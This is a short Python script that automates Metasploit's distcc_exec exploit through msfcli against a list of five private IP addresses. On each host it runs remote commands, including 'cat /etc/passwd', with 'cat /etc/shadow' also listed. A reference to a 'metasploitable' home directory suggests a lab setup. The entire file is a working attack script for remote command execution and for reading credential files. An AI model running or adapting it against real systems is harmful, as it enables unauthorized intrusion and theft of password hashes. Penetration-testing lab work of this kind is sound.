#!/usr/bin/env python
import os
import sys

#n_attacks = 2
rhosts = ['10.67.180.120',\
            '10.67.180.121',\
            '10.67.180.150',\
            '10.67.180.175',\
            '10.67.180.196']


exploit = '/exploit/unix/misc/distcc_exec'
#rhost = sys.argv[1] # Remote host provided as argument
payload = 'cmd/unix/generic'
cmd = ['cat /etc/passwd',\
        'cat /etc/shadow',\
        'ls /home/metasploitable',\
        'ls $HOME',\
        'echo $HOME > /tmp/home && cat /tmp/home']

#for k in range(n_attacks):
for rhost in rhosts:
    for l in cmd[0:1]:
        command = 'msfcli %s RHOST=%s PAYLOAD=\'%s\' CMD=\'%s\' E ' %\
                    (exploit,rhost,payload,l)
        os.system(command)
